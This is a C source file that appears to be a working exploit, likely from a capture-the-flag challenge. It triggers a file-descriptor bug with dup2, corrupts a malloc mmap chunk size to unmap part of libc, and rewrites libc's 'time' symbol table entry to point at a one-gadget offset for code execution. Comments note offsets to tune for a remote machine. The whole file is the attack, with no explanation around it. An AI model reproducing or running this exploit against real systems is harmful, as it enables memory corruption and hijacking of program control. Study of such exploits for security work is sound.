#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

typedef struct
{
    uint32_t st_name;
    uint8_t st_info;
    uint8_t st_other;
    uint16_t st_shndx;
    uint64_t st_value;
    uint64_t st_size;
} Elf64_Sym;

int main()
{
    // close stdin, stdout, stderr since we dont need them and so fd id 0, 1, 2 is free
    close(2);
    close(1);
    close(0);

    // fd 0 fileid 0
    int mapped_fd = open("/tmp/d", O_RDWR | O_CREAT, 0777);
    write(mapped_fd, "aawd", 4);
    // mmap file so that the tmp file is created
    mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, mapped_fd, 0);


    // open a dummy file
    // fd 1 fileid 1
    int fd = open("/tmp/a", O_RDWR | O_CREAT, 0777);

    // for reasons the cap of the file  might need to be changed on remote
    // it should be consistent per machine, but will depend on the kernel build? for the exact offset
    // expand the file to cap
    lseek(fd, 0x2c000, SEEK_SET);
    write(fd, "a", 1);
    mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);

    // close will not unmap fileid 0 still taken fd 0 free
    close(fd);
    // we need random files which will be mapped to 0x30 pages and we can unmap
    // fd 1 fileid 2
    int dummy = open("/lib/x86_64-linux-gnu/libaudit.so.1.0.0", O_RDONLY);
    // fd 2 fileid 3
    int dummy2 = open("/lib/x86_64-linux-gnu/libc_malloc_debug.so.0", O_RDONLY);

    // open some files to fill one pages holes might need to do more or less depending on machine
    open("/tmp/e", O_RDWR | O_CREAT, 0777);

    // we need a writable file that already exists in the system
    // fd 3 fileid 4
    fd = open("/tmp/6cc136ddf2746468", O_WRONLY);
    // fd 4
    int fd2 = open("/tmp/b", O_RDWR | O_CREAT, 0777);
    // perform bug
    dup2(fd2, fd2);
    close(fd2);
    close(dummy);
    close(dummy2);

    fd2 = open("/tmp/b", O_RDWR | O_CREAT, 0777);
    dup2(fd2, 5000);

    // overwrite malloc mmap chunk size to unmap part of libc sections
    size_t new_size = 0x61002 + 0x10000;
    pwrite(fd, &new_size, 8, 8);

    // preparing data to write
    int libc = open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY);
    void *libc_map = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE, libc, 0);
    Elf64_Sym *time_sym = libc_map + 0xfac0;
    // modify address to onegadget
    time_sym->st_value = 0xef52b;
    // change type to FUNC instead of IFUNC
    time_sym->st_info &= 0xf0;
    time_sym->st_info |= 2;

    dup2(fd2, 9000);
    // overwrite libc symtab
    write(fd2, libc_map, 0x10000);

    int fd3 = open("/tmp/c", O_RDWR | O_CREAT, 0777);
    struct stat st;
    fstat(fd3, &st);

    exit(0);
}